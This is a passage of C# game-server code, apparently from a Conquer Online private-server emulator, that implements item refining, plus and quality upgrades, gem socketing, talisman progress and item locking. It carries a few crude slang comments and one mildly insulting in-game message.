                            if (item.Position == 16)
                                return;

                            if (item.ExtraEffect.EffectID > 0)
                                Database.ItemAddingTable.RemoveAdding(item.UID, item.ExtraEffect.EffectID);
                            //  client.Send(ps);

                            ItemAdding.Refinery_ purify = new ItemAdding.Refinery_();
                            purify.AddedOn = DateTime.Now;
                            purify.Available = true;
                            purify.ItemUID = ps.ItemUID;
                            purify.EffectLevel = refineStats.Level;
                            purify.EffectDuration = 7 * 24 * 60 * 60;
                            purify.EffectID = refineStats.Identifier;
                            purify.EffectPercent = refineStats.Percent;
                            Database.ItemAddingTable.AddExtraEffect(purify);
                            item.ExtraEffect = purify;
                            item.Mode = MTA.Game.Enums.ItemMode.Update;
                            item.Send(client);

                            //   ItemAdding effect = new ItemAdding(true);
                            //   effect.Type = ItemAdding.ExtraEffect;
                            //   effect.Append2(purify);
                            //   client.Send(effect);

                            client.Inventory.Remove(refine, MTA.Game.Enums.ItemUse.Remove);
                            client.CalculateStatBonus();
                            client.LoadItemStats();
                            client.CalculateHPBonus();
                            client.Send(ps);

                            client.Send(WindowStats(client));

                            /*    client.Inventory.Remove(refine, Game.Enums.ItemUse.Remove);
                                item.RefineItem = refineStats.Identifier;
                                item.RefineryTime = DateTime.Now.AddDays(7);
                                item.Mode = Game.Enums.ItemMode.Update;
                                item.Send(client);

                                client.CalculateStatBonus();
                                client.CalculateHPBonus();
                                client.LoadItemStats();
                                //Calculations.AttackDefence(ref c.MTA);

                                Database.ConquerItemTable.UpdateRefineryItem(item);
                                Database.ConquerItemTable.UpdateRefineryTime(item);
                                client.Send(WindowStats(client));*/
                            //LoadItemStatus(client);
                            // c.Send(new Game_MTAStats(c.MTA));
                        }
                        else
                            client.Send(new Message(String.Format("You cannot refine your {0} with that {1}.",
                                Database.ConquerItemInformation.BaseInformations[item.ID].Name, Database.ConquerItemInformation.BaseInformations[refine.ID].Name), System.Drawing.Color.Red, Message.TopLeft));
                    }
                    else
                        Console.WriteLine(String.Format("No database refinery {0}", refine.ID));
                }
            }
        }
        public static bool IsEquipment(long ID)
        {
            return ItemPosition((uint)ID) != 0;
        }
        #region a7a low etshal tany b2a
        static void ComposePlus(Compose compose, Client.GameState client)
        {
            ConquerItem Item = null;
            ConquerItem[] Minors = null;
            if (client.Inventory.TryGetItem(compose[0], out Item) || (client.Equipment.TryGetItem(compose[0]) != null) || (compose.Mode == Compose.QuickCompose))
            {
                if (Item == null && client.Inventory.TryGetItem(compose[0], out Item) == false && (client.Equipment.TryGetItem(compose[0]) != null))
                    Item = client.Equipment.TryGetItem(compose[0]);

                if (compose.Mode == Compose.DragonBallUpgrade || compose.Mode == Compose.MeteorUpgrade)
                {
                    Minors = new ConquerItem[compose.Countx];
                    for (int i = 0; i < compose.Countx; i++)
                    {
                        if (!client.Inventory.TryGetItem(compose[i + 2], out Minors[i]))
                            return;
                        else
                            if (Minors[i].UID == Item.UID)
                            return;
                    }
                }
                else
                {
                    Minors = new ConquerItem[compose.Count - 1];
                    for (int i = 0; i < compose.Count - 1; i++)
                    {
                        if (!client.Inventory.TryGetItem(compose[i + 1], out Minors[i]))
                            return;
                        else
                            if (Minors[i].UID == Item.UID)
                            return;
                    }
                }
                ushort pos = ItemPosition(Item.ID);
                if (pos == ConquerItem.Bottle || pos == ConquerItem.Garment || pos == ConquerItem.LeftWeaponAccessory || pos == ConquerItem.RightWeaponAccessory || pos == ConquerItem.SteedArmor) //mohsen.. i'm remove crop
                    return;

                if (compose.Mode == Compose.ChanceUpgrade || compose.Mode == Compose.QuickCompose)
                {
                    if (Item.Plus < 12 && Item.PlusProgress != 0)
                    {
                        double percent = (double)Item.PlusProgress / (double)Database.DataHolder.ComposePlusPoints(Item.Plus);
                        if (Kernel.Rate(percent))
                        {
                            Item.PlusProgress = 0;
                            Item.Plus++;
                        }
                        else
                            Item.PlusProgress = 0;
                        Item.Mode = MTA.Game.Enums.ItemMode.Update;
                        Item.Send(client);
                        Database.ConquerItemTable.UpdatePlus(Item);
                        Database.ConquerItemTable.UpdatePlusProgress(Item);
                        if (Item.Plus >= 9)
                            Kernel.SendWorldMessage(new Message("Congratulations, " + client.Entity.Name + " has upgraded His " + Database.ConquerItemInformation.BaseInformations[Item.ID].Name + " to + " + Item.Plus + " and " + Item.PlusProgress + " in Progress!", System.Drawing.Color.Red, Network.GamePackets.Message.TopLeft), Program.Values);
                    }
                    return;
                }
                if (compose.Mode == Compose.MeteorUpgrade || compose.Mode == Compose.DragonBallUpgrade)
                {
                    Database.ConquerItemInformation info = new MTA.Database.ConquerItemInformation(Item.ID, Item.Plus);

                    Minors = new ConquerItem[compose.Count - 2];
                    for (int i = 0; i < compose.Count - 2; i++)
                    {
                        if (!client.Inventory.TryGetItem(compose[i + 2], out Minors[i]))
                            return;
                        else
                            if (Minors[i].UID == Item.UID)
                            return;
                    }
                    switch (compose.Mode)
                    {
                        case Compose.DragonBallUpgrade:
                            {
                                if (Item.ID % 10 == (byte)Game.Enums.ItemQuality.Super)
                                    break;
                                if (Item.Durability < Item.MaximDurability)
                                    break;
                                // byte chance = (byte)(70 - ((infos.BaseInformation.Level - (infos.BaseInformation.Level > 100 ? 30 : 0)) / (10 - Item.ID % 10)));
                                byte cost = DragonBallUpgradeCost(Item, info);
                                double chance = (((double)compose.Countx / (double)cost) * 100);
                                if (MyMath.Success(chance))
                                {
                                    switch ((Game.Enums.ItemQuality)(Item.ID % 10))
                                    {
                                        case Game.Enums.ItemQuality.Normal:
                                        case Game.Enums.ItemQuality.NormalV1:
                                        case Game.Enums.ItemQuality.NormalV2:
                                        case Game.Enums.ItemQuality.NormalV3: Item.ID = (Item.ID - (Item.ID % 10)) + (byte)Game.Enums.ItemQuality.Refined; break;
                                        default: Item.ID++; break;
                                    }
                                    Database.ConquerItemTable.UpdateItemID(Item, client);
                                    Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                    Item.Send(client);
                                    client.Send(new ItemUsage(true)
                                    {
                                        UID = client.Entity.UID,
                                        dwParam = 1,
                                        ID = ItemUsage.DragonBallUpgrade
                                    });
                                }
                                else
                                {
                                    Item.Durability = (ushort)(Item.Durability / 2);
                                    Database.ConquerItemTable.UpdateDurabilityItem(Item);
                                    Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                    Item.Send(client);
                                }
                                foreach (var item in Minors)
                                    client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.Remove);
                                if (compose.Countx > cost)
                                {
                                    var diff = compose.Countx - cost;
                                    client.Inventory.Add((uint)(Minors[0].ID == 720028 ? 1088000 : 1088001), 0, (byte)diff);
                                }
                                break;

                            }
                        case Compose.MeteorUpgrade:
                            {
                                if (info.BaseInformation.Level == ItemMaxLevel(ItemPosition(info.BaseInformation.ID)))
                                    break;
                                if (Item.Durability < Item.MaximDurability)
                                {
                                    client.MessageBox("Ro7 sal7ha ya Dog ..", null, null);
                                    break;
                                }
                                byte cost = MeteorUpgradeCost(Item.ID);
                                if (ItemPosition(Item.ID) == (ushort)ConquerItem.Armor || ItemPosition(Item.ID) == (ushort)ConquerItem.Head || IsShield(Item.ID))
                                {
                                    if (info.BaseInformation.Level >= 110)
                                        cost = 1;
                                }
                                else
                                {
                                    if (info.BaseInformation.Level >= 115)
                                        cost = 1;
                                }
                                double chance = (((double)compose.Countx / (double)cost) * 100);
                                uint newid = info.CalculateUplevel();
                                if (newid != 0 && newid != Item.ID)
                                {
                                    if (MyMath.Success(chance))
                                    {
                                        Item.ID = newid;
                                        info = new MTA.Database.ConquerItemInformation(Item.ID, Item.Plus);
                                        Item.Durability = Item.MaximDurability = info.BaseInformation.Durability;
                                        Database.ConquerItemTable.UpdateItemID(Item, client);
                                        Database.ConquerItemTable.UpdateDurabilityItem(Item);
                                        Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                        Item.Send(client);

                                        client.Send(new ItemUsage(true)
                                        {
                                            UID = client.Entity.UID,
                                            dwParam = 1,
                                            ID = ItemUsage.MeteorUpgrade
                                        });

                                    }
                                    else
                                    {
                                        Item.Durability = (ushort)(Item.Durability / 2);
                                        Database.ConquerItemTable.UpdateDurabilityItem(Item);
                                        Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                        Item.Send(client);
                                    }
                                }
                                foreach (var item in Minors)
                                    client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.Remove);
                                if (compose.Countx > cost)
                                {
                                    var diff = compose.Countx - cost;
                                    client.Inventory.Add((uint)(Minors[0].ID == 720028 ? 1088000 : 1088001), 0, (byte)diff);
                                }
                                break;
                            }
                    }
                }

                foreach (var item in Minors)
                {
                    var ItemPlus = item;
                    Database.ConquerItemInformation infos = new MTA.Database.ConquerItemInformation(Item.ID, Item.Plus);
                    switch (compose.Mode)
                    {
                        case Compose.CurrentSteed:
                        case Compose.Plus:
                            {
                                if (Item.Plus < 12 && Item.GetItemType() != ConquerItem.ItemTypes.GarmentID_1 && Item.GetItemType() != ConquerItem.ItemTypes.GarmentID_2 && Item.GetItemType() != ConquerItem.ItemTypes.BottleID && Item.GetItemType() != ConquerItem.ItemTypes.RightAccessory1 && Item.GetItemType() != ConquerItem.ItemTypes.RightAccessory2 && Item.GetItemType() != ConquerItem.ItemTypes.RightAccessory3 && Item.GetItemType() != ConquerItem.ItemTypes.LeftAccessory)
                                {
                                    Item.PlusProgress += Database.DataHolder.StonePlusPoints(ItemPlus.Plus);
                                    while (Item.PlusProgress >= Database.DataHolder.ComposePlusPoints(Item.Plus) && Item.Plus != 12)
                                    {
                                        Item.PlusProgress -= Database.DataHolder.ComposePlusPoints(Item.Plus);
                                        Item.Plus++;
                                        if (Item.Plus == 12)
                                            Item.PlusProgress = 0;
                                    }
                                    Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                    Item.Send(client);
                                    Database.ConquerItemTable.UpdatePlus(Item);
                                    Database.ConquerItemTable.UpdatePlusProgress(Item);
                                    client.Inventory.Remove(ItemPlus, MTA.Game.Enums.ItemUse.Remove);
                                    if (Item.Plus >= 9)
                                        Kernel.SendWorldMessage(new Message("Congratulations, " + client.Entity.Name + " has upgraded His " + Database.ConquerItemInformation.BaseInformations[Item.ID].Name + " to + " + Item.Plus + " and " + Item.PlusProgress + " in Progress!", System.Drawing.Color.Red, Network.GamePackets.Message.TopLeft), Program.Values);
                                }
                                break;
                            }
                        case Compose.NewSteed:
                            {
                                if (Item.Plus < 12)
                                {
                                    Item.PlusProgress += Database.DataHolder.StonePlusPoints(ItemPlus.Plus);
                                    while (Item.PlusProgress >= Database.DataHolder.ComposePlusPoints(Item.Plus) && Item.Plus != 12)
                                    {
                                        Item.PlusProgress -= Database.DataHolder.ComposePlusPoints(Item.Plus);
                                        Item.Plus++;
                                        if (Item.Plus == 12)
                                            Item.PlusProgress = 0;
                                    }
                                    Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                    Item.Send(client);
                                    Database.ConquerItemTable.UpdatePlus(Item);
                                    client.Inventory.Remove(ItemPlus, MTA.Game.Enums.ItemUse.Remove);
                                }

                                int color1 = (int)Item.SocketProgress;
                                int color2 = (int)ItemPlus.SocketProgress;

                                int G1 = color1 & 0xFF;
                                int G2 = color2 & 0xFF;
                                int B1 = (color1 >> 8) & 0xFF;
                                int B2 = (color2 >> 8) & 0xFF;
                                int R1 = (color1 >> 16) & 0xFF;
                                int R2 = (color2 >> 16) & 0xFF;
                                Item.NextGreen = (byte)((int)Math.Floor(0.9 * G1) + (int)Math.Floor(0.1 * G2) + 1);
                                Item.NextBlue = (byte)((int)Math.Floor(0.9 * B1) + (int)Math.Floor(0.1 * B2) + 1);
                                Item.NextRed = (byte)((int)Math.Floor(0.9 * R1) + (int)Math.Floor(0.1 * R2) + 1);
                                Item.SocketProgress = (uint)(Item.NextGreen | (Item.NextBlue << 8) | (Item.NextRed << 16));

                                Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                Item.Send(client);
                                Database.ConquerItemTable.UpdatePlusProgress(Item);
                                Database.ConquerItemTable.UpdateSocketProgress(Item);
                                //  Database.ConquerItemTable.UpdateNextSteedColor(Item);
                                client.Inventory.Remove(ItemPlus, MTA.Game.Enums.ItemUse.Remove);
                                break;
                            }

                    }
                }
            }
        }


        static byte DragonBallUpgradeCost(ConquerItem Item, Database.ConquerItemInformation info)
        {
            int change = 100;
            switch (Item.ID % 10)
            {
                case 6: change = 50; break;
                case 7: change = 33; break;
                case 8: change = 20; break;
                default: change = 100; break;
            }
            int level = info.BaseInformation.Level;
            if (level > 70)
                change = (int)(change * (100 - (level - 70) * 1.0) / 100);
            return (byte)(100 / change + 1);
        }
        public static byte GetLevel(uint ID)
        {
            if (ItemPosition(ID) == (ushort)ConquerItem.Armor || ItemPosition(ID) == (ushort)ConquerItem.Head || IsShield(ID))
                return (byte)((ID % 100) / 10);
            else
                return (byte)((ID % 1000) / 10);
        }
        public static byte MeteorUpgradeCost(uint ID)
        {
            int wQuality = (int)(ID % 10);
            byte nLevel = GetLevel(ID);
            switch (wQuality)
            {
                case 9:
                    {
                        if (ItemPosition(ID) == (ushort)ConquerItem.Armor || ItemPosition(ID) == (ushort)ConquerItem.Head || IsShield(ID))
                        {
                            if (nLevel <= 4) return 3;
                            if (nLevel == 5) return 25;
                            if (nLevel == 6) return 31;
                            if (nLevel == 7) return 40;
                            if (nLevel > 7) return 61;
                        }
                        else
                        {
                            if (nLevel <= 10)
                                return 3;
                            else if (nLevel <= 12)
                                return 14;
                            else if (nLevel <= 14)
                                return 15;
                            else if (nLevel <= 16)
                                return 18;
                            else if (nLevel <= 18)
                                return 20;
                            else if (nLevel <= 20)
                                return 25;
                            else
                                return 31;
                        }
                        break;
                    }
                case 8:
                    {
                        if (ItemPosition(ID) == (ushort)ConquerItem.Armor || ItemPosition(ID) == (ushort)ConquerItem.Head || IsShield(ID))
                        {
                            if (nLevel <= 4) return 2;
                            if (nLevel == 5) return 8;
                            if (nLevel == 6) return 10;
                            if (nLevel == 7) return 14;
                            if (nLevel > 7) return 20;
                        }
                        else
                        {
                            if (nLevel <= 10)
                                return 2;
                            else if (nLevel <= 12)
                                return 4;
                            else if (nLevel <= 16)
                                return 6;
                            else if (nLevel <= 18)
                                return 7;
                            else if (nLevel <= 20)
                                return 8;
                            else
                                return 9;
                        }
                        break;
                    }
                case 7:
                    {
                        if (ItemPosition(ID) == (ushort)ConquerItem.Armor || ItemPosition(ID) == (ushort)ConquerItem.Head || IsShield(ID))
                        {
                            if (nLevel <= 4) return 2;
                            if (nLevel > 4 && nLevel < 6) return 3;
                            if (nLevel == 6) return 4;
                            if (nLevel == 7) return 6;
                            if (nLevel > 7) return 9;
                        }
                        else
                        {
                            if (nLevel <= 15)
                                return 2;
                            else if (nLevel <= 20)
                                return 3;
                            else
                                return 4;
                        }
                        break;
                    }
                case 6:
                    {
                        if (ItemPosition(ID) == (ushort)ConquerItem.Armor || ItemPosition(ID) == (ushort)ConquerItem.Head || IsShield(ID))
                        {
                            if (nLevel <= 4) return 2;
                            if (nLevel > 4 && nLevel < 7) return 3;
                            if (nLevel == 7) return 4;
                            if (nLevel > 7) return 7;
                        }
                        else
                        {
                            if (nLevel <= 18)
                                return 2;
                            else
                                return 3;
                        }
                        break;
                    }
                default:
                    {
                        if (ItemPosition(ID) == (ushort)ConquerItem.Armor || ItemPosition(ID) == (ushort)ConquerItem.Head || IsShield(ID))
                        {
                            if (nLevel <= 4) return 2;
                            if (nLevel > 4 && nLevel < 7) return 3;
                            if (nLevel == 7) return 4;
                            if (nLevel > 7) return 7;
                        }
                        else
                        {
                            if (nLevel <= 19)
                                return 2;
                            else
                                return 3;
                        }
                        break;
                    }
            }
            return 0;
        }
        #endregion a7a low etshal tany b2a

        static void SocketItem(ItemUsage usage, Client.GameState client)
        {
            ConquerItem item = null;
            ConquerItem[] Minors = null;
            if (client.Inventory.TryGetItem(usage.UID, out item))
            {
                ushort pos = ItemPosition(item.ID);
                if (pos == ConquerItem.Bottle || pos == ConquerItem.Fan || pos == ConquerItem.Garment || pos == ConquerItem.LeftWeaponAccessory || pos == ConquerItem.RightWeaponAccessory || pos == ConquerItem.Steed || pos == ConquerItem.SteedArmor || pos == ConquerItem.SteedCrop || pos == ConquerItem.Tower || pos == ConquerItem.Wing)
                {
                    client.Send(new Message("Sorry can't make socket in this item !", System.Drawing.Color.Red, Message.Talk));
                    return;
                }

                Minors = new ConquerItem[usage.Batch.Length];
                for (int i = 0; i < usage.Batch.Length; i++)
                {
                    if (!client.Inventory.TryGetItem(usage.Batch[i], out Minors[i]))
                        return;
                    else
                        if (Minors[i].UID == item.UID)
                        return;
                }
                if (Minors.Length == 0)
                    return;
                if (item.SocketOne == MTA.Game.Enums.Gem.NoSocket)
                {
                    ushort cost = 1;
                    if (pos != ConquerItem.RightWeapon && pos != ConquerItem.LeftWeapon)
                        cost = 12;

                    if (client.Inventory.Contains(1088000, cost))
                    {
                        item.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                        item.Mode = MTA.Game.Enums.ItemMode.Update;
                        item.Send(client);
                        usage.dwParam = 1;
                        client.LoadItemStats();
                        Database.ConquerItemTable.UpdateSockets(item);
                        foreach (var xitem in Minors)
                        {
                            client.Inventory.Remove(xitem.UID, MTA.Game.Enums.ItemUse.Remove, true);
                        }
                    }
                }
                else if (item.SocketTwo == MTA.Game.Enums.Gem.NoSocket)
                {
                    ushort cost = 5;
                    if (pos != ConquerItem.RightWeapon && pos != ConquerItem.LeftWeapon)
                    {
                        cost = 1;
                        var minor = Minors.FirstOrDefault();
                        if (minor.ID == 1200005)
                        {
                            if (client.Inventory.Contains(1200005, cost))
                            {
                                if (Kernel.Rate((double)30))
                                {
                                    item.SocketTwo = MTA.Game.Enums.Gem.EmptySocket;
                                    item.Mode = MTA.Game.Enums.ItemMode.Update;
                                    item.Send(client);
                                    usage.dwParam = 1;
                                    client.LoadItemStats();
                                    Database.ConquerItemTable.UpdateSockets(item);
                                }
                                else
                                {
                                    usage.dwParam = 0;
                                    client.Inventory.Add(1200006, 0, 1);
                                }
                                foreach (var xitem in Minors)
                                {
                                    client.Inventory.Remove(xitem.UID, MTA.Game.Enums.ItemUse.Remove, true);
                                }
                            }
                        }
                        else if (minor.ID == 1200006)
                        {
                            cost = 7;
                            if (client.Inventory.Contains(1200006, cost))
                            {
                                item.SocketTwo = MTA.Game.Enums.Gem.EmptySocket;
                                item.Mode = MTA.Game.Enums.ItemMode.Update;
                                item.Send(client);
                                usage.dwParam = 1;
                                client.LoadItemStats();
                                Database.ConquerItemTable.UpdateSockets(item);
                                foreach (var xitem in Minors)
                                {
                                    client.Inventory.Remove(xitem.UID, MTA.Game.Enums.ItemUse.Remove, true);
                                }
                            }
                        }
                    }
                    else
                    {
                        if (client.Inventory.Contains(1088000, cost))
                        {
                            item.SocketTwo = MTA.Game.Enums.Gem.EmptySocket;
                            item.Mode = MTA.Game.Enums.ItemMode.Update;
                            item.Send(client);
                            usage.dwParam = 1;
                            client.LoadItemStats();
                            Database.ConquerItemTable.UpdateSockets(item);
                            foreach (var xitem in Minors)
                            {
                                client.Inventory.Remove(xitem.UID, MTA.Game.Enums.ItemUse.Remove, true);
                            }
                        }
                    }
                }
            }
        }

        static void SocketItem(EmbedSocket socket, Client.GameState client)
        {
            ConquerItem Item = null;
            ConquerItem Gem = null;
            if (client.Inventory.TryGetItem(socket.ItemUID, out Item) || (client.Equipment.TryGetItem(socket.ItemUID) != null))
            {
                if (Item == null && client.Inventory.TryGetItem(socket.ItemUID, out Item) == false && (client.Equipment.TryGetItem(socket.ItemUID) != null))
                    Item = client.Equipment.TryGetItem(socket.ItemUID);
                ushort sock = ItemPosition(Item.ID);
                if (sock == 7 || sock == 9 || sock > 19)
                {
                    client.Send(new Message("Sorry can't make socket in this item !", System.Drawing.Color.Red, Message.Talk));
                    return;
                }
                if (client.Inventory.TryGetItem(socket.GemUID, out Gem) || socket.Mode == EmbedSocket.Remove)
                {
                    switch (socket.Mode)
                    {
                        case EmbedSocket.Add:
                            {
                                byte gemBase = (byte)(Gem.ID % 1000);
                                #region No ONecan make un allowedgem in Talisman
                                if (sock == (ushort)Positions.AttackTalisman)
                                {
                                    if (!(gemBase >= (byte)Game.Enums.Gem.NormalThunderGem && gemBase <= (byte)Game.Enums.Gem.SuperThunderGem))
                                    {
                                        client.Send(new Message("Sorry can't make socket in this item !", System.Drawing.Color.Red, Message.Talk));
                                        return;
                                    }
                                }
                                if (sock == (ushort)Positions.DefenceTalisman)
                                {
                                    if (!(gemBase >= (byte)Game.Enums.Gem.NormalGloryGem && gemBase <= (byte)Game.Enums.Gem.SuperGloryGem))
                                    {
                                        client.Send(new Message("Sorry can't make socket in this item !", System.Drawing.Color.Red, Message.Talk));
                                        return;
                                    }
                                }
                                #endregion No ONecan make un allowedgem in Talisman
                                if (Enum.IsDefined(typeof(Game.Enums.Gem), gemBase))
                                {
                                    switch (socket.Slot)
                                    {
                                        case EmbedSocket.SlotOne:
                                            {
                                                if ((byte)Item.SocketOne == 255)
                                                {
                                                    Item.SocketOne = (MTA.Game.Enums.Gem)(Gem.ID % 1000);
                                                    Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                                    Item.Send(client);
                                                    Database.ConquerItemTable.UpdateSockets(Item);
                                                    client.Inventory.Remove(Gem, MTA.Game.Enums.ItemUse.RemoveFromStack);
                                                    break;
                                                }
                                                break;
                                            }
                                        case EmbedSocket.SlotTwo:
                                            {
                                                if ((byte)Item.SocketOne > 0 && (byte)Item.SocketOne < 255)
                                                {
                                                    if ((byte)Item.SocketTwo == 255)
                                                    {
                                                        Item.SocketTwo = (MTA.Game.Enums.Gem)(Gem.ID % 1000);
                                                        Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                                        Item.Send(client);
                                                        Database.ConquerItemTable.UpdateSockets(Item);
                                                        client.Inventory.Remove(Gem, MTA.Game.Enums.ItemUse.RemoveFromStack);
                                                    }
                                                }
                                                else if ((byte)Item.SocketOne == 255)
                                                {
                                                    Item.SocketOne = (MTA.Game.Enums.Gem)(Gem.ID % 1000);
                                                    Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                                    Item.Send(client);
                                                    Database.ConquerItemTable.UpdateSockets(Item);
                                                    client.Inventory.Remove(Gem, MTA.Game.Enums.ItemUse.RemoveFromStack);
                                                }
                                                break;
                                            }
                                    }
                                }
                                break;
                            }
                        case EmbedSocket.Remove:
                            {
                                switch (socket.Slot)
                                {
                                    case EmbedSocket.SlotOne:
                                        {
                                            if ((byte)Item.SocketOne != 0)
                                            {
                                                Item.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                                if ((byte)Item.SocketTwo != 0 && (byte)Item.SocketTwo != 255)
                                                {
                                                    Item.SocketOne = Item.SocketTwo;
                                                    Item.SocketTwo = MTA.Game.Enums.Gem.EmptySocket;
                                                }
                                                Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                                Item.Send(client);
                                                Database.ConquerItemTable.UpdateSockets(Item);
                                                break;
                                            }
                                            break;
                                        }
                                    case EmbedSocket.SlotTwo:
                                        {
                                            if ((byte)Item.SocketTwo != 0 && (byte)Item.SocketTwo != 255)
                                            {
                                                Item.SocketTwo = MTA.Game.Enums.Gem.EmptySocket;
                                                Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                                Item.Send(client);
                                                Database.ConquerItemTable.UpdateSockets(Item);
                                            }
                                            else
                                            {
                                                if ((byte)Item.SocketOne != 0)
                                                {
                                                    Item.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                                                    Item.Mode = MTA.Game.Enums.ItemMode.Update;
                                                    Item.Send(client);
                                                    Database.ConquerItemTable.UpdateSockets(Item);
                                                }
                                            }
                                            break;
                                        }
                                }
                                break;
                            }
                    }
                }
                client.Send(socket);
                System.Threading.Thread.Sleep(500);
            }
        }

        static void LockItem(ItemLock itemLock, Client.GameState client)
        {
            ConquerItem item = null;
            if (client.Inventory.TryGetItem(itemLock.UID, out item))
            {
                itemLock.ID = 1;
                item.Lock = 1;
                item.Mode = Game.Enums.ItemMode.Update;
                client.Send(itemLock);
                item.Send(client);
                Database.ConquerItemTable.UpdateLock(item);
            }
            else if (client.Equipment.TryGetItem(itemLock.UID) != null)
            {
                item = client.Equipment.TryGetItem(itemLock.UID);
                itemLock.ID = 1;
                item.Lock = 1;
                item.Mode = Game.Enums.ItemMode.Update;
                client.Send(itemLock);
                item.Send(client);
                Database.ConquerItemTable.UpdateLock(item);
            }
        }
        static void UnlockItemInstant(ItemLock itemLock, Client.GameState client)
        {
            ConquerItem item = null;
            if (client.Inventory.TryGetItem(itemLock.UID, out item))
            {
                if (item.Lock == 1)
                {
                    item.Lock = 0;
                    item.Mode = Game.Enums.ItemMode.Update;
                    item.Send(client);
                    Database.ConquerItemTable.UpdateLock(item);
                }
                else
                    client.Send(new Message("Can't unlock an item that is in progress of unlocking.", System.Drawing.Color.FloralWhite, Message.TopLeft));
            }
        }
        static void UnlockItem5Days(ItemLock itemLock, Client.GameState client)
        {
            ConquerItem item = null;
            if (client.Inventory.TryGetItem(itemLock.UID, out item))
            {
                if (item.Lock == 1)
                {
                    item.Lock = 2;
                    item.UnlockEnd = DateTime.Now.AddDays(5);
                    item.Mode = Game.Enums.ItemMode.Update;
                    item.Send(client);
                    Database.ConquerItemTable.UpdateLock(item);
                }
                else
                    client.Send(new Message("Can't unlock an item that is in progress of unlocking.", System.Drawing.Color.FloralWhite, Message.TopLeft));
            }
        }

        static void SocketTalismanWithItem(ItemUsage itemUsage, Client.GameState client)
        {
            ConquerItem talisman = client.Equipment.TryGetItem(itemUsage.UID);
            ConquerItem item = null;
            for (ushort i = 91; i < 91 + 4 * itemUsage.ToArray()[26]; i += 4)
            {
                uint item_swap = BitConverter.ToUInt32(itemUsage.ToArray(), i);

                if (client.Inventory.TryGetItem(item_swap, out item))
                {
                    if (talisman == null)
                        return;
                    if (item.ID / 1000 == talisman.ID / 1000)
                        return;
                    if (item.Bound == true)
                        return;
                    if (talisman.SocketTwo != Game.Enums.Gem.NoSocket)
                        return;

                    ushort Points = 0;
                    switch (item.ID % 10)
                    {
                        case 6: Points += 5; break;
                        case 7: Points += 10; break;
                        case 8: Points += 40; break;
                        case 9: Points += 1000; break;
                    }
                    Points += Database.DataHolder.TalismanPlusPoints(item.Plus);

                    int position = ItemPosition(item.ID);
                    switch (position)
                    {
                        case 0: return;
                        case 4:
                        case 5:
                            if (item.ID % 10 >= 8)
                            {
                                if (item.SocketOne != Game.Enums.Gem.NoSocket)
                                    Points += 160;
                                if (item.SocketTwo != Game.Enums.Gem.NoSocket)
                                    Points += 800;
                            }
                            break;
                        default:
                            if (item.ID % 10 >= 8)
                            {
                                if (item.SocketOne != Game.Enums.Gem.NoSocket)
                                    Points += 2000;
                                if (item.SocketTwo != Game.Enums.Gem.NoSocket)
                                    Points += 6000;
                            }
                            break;
                    }
                    talisman.SocketProgress += Points;
                    if (talisman.SocketOne == Game.Enums.Gem.NoSocket)
                    {
                        if (talisman.SocketProgress >= 8000)
                        {
                            talisman.SocketProgress -= 8000;
                            talisman.SocketOne = Game.Enums.Gem.EmptySocket;

                            talisman.Mode = Game.Enums.ItemMode.Update;
                            talisman.Send(client);
                            if (talisman.Position != 0)
                                client.LoadItemStats();
                        }
                    }
                    if (talisman.SocketOne != Game.Enums.Gem.NoSocket)
                    {
                        if (talisman.SocketProgress >= 20000)
                        {
                            talisman.SocketProgress = 0;
                            talisman.SocketTwo = Game.Enums.Gem.EmptySocket;
                        }
                    }
                    talisman.Mode = Game.Enums.ItemMode.Update;
                    talisman.Send(client);
                    Database.ConquerItemTable.UpdateSocketProgress(talisman);
                    Database.ConquerItemTable.UpdateSockets(talisman);
                    if (talisman.Position != 0)
                        client.LoadItemStats();
                    client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                }
            }
        }
        static void SocketTalismanWithCPs(ItemUsage itemUsage, Client.GameState client)
        {
            ConquerItem talisman = client.Equipment.TryGetItem(itemUsage.UID);

            if (talisman == null)
                return;

            ushort pos = ItemPosition(talisman.ID);
            if (pos != ConquerItem.Fan && pos != ConquerItem.Tower && pos != ConquerItem.Wing)
                return;

            uint price = 0;
            if (talisman.SocketOne == MTA.Game.Enums.Gem.NoSocket)
            {
                double procent = 100 - (talisman.SocketProgress * 25600 / 2048000);
                if (100 - procent < 25)
                    return;
                price = (uint)(procent * 55);
            }
            else if (talisman.SocketTwo == MTA.Game.Enums.Gem.NoSocket)
            {
                double procent = 100 - (talisman.SocketProgress * 25600 / 5120000);
                if (100 - procent < 25)
                    return;
                price = (uint)(procent * 110);
            }
            else
                return;
            if (client.Entity.ConquerPoints >= price)
            {
                client.Entity.ConquerPoints -= price;
                if (talisman.SocketOne == MTA.Game.Enums.Gem.NoSocket)
                    talisman.SocketOne = MTA.Game.Enums.Gem.EmptySocket;
                else if (talisman.SocketTwo == MTA.Game.Enums.Gem.NoSocket)
                    talisman.SocketTwo = MTA.Game.Enums.Gem.EmptySocket;
                talisman.SocketProgress = 0;
                Database.ConquerItemTable.UpdateSockets(talisman);
                talisman.Mode = MTA.Game.Enums.ItemMode.Update;
                talisman.Send(client);
            }
        }

        static void EnchantItem(ItemUsage itemUsage, Client.GameState client)
        {
            ConquerItem Item = null, EnchantGem = null;
            if (client.Inventory.TryGetItem(itemUsage.UID, out Item) && client.Inventory.TryGetItem(itemUsage.dwParam, out EnchantGem))
            {
                ushort pos = ItemPosition(Item.ID);
                if (pos == ConquerItem.Bottle || pos == ConquerItem.Fan || pos == ConquerItem.Garment || pos == ConquerItem.LeftWeaponAccessory || pos == ConquerItem.RightWeaponAccessory || pos == ConquerItem.Steed || pos == ConquerItem.SteedArmor || pos == ConquerItem.SteedCrop || pos == ConquerItem.Wing || pos == ConquerItem.Tower)
                    return;
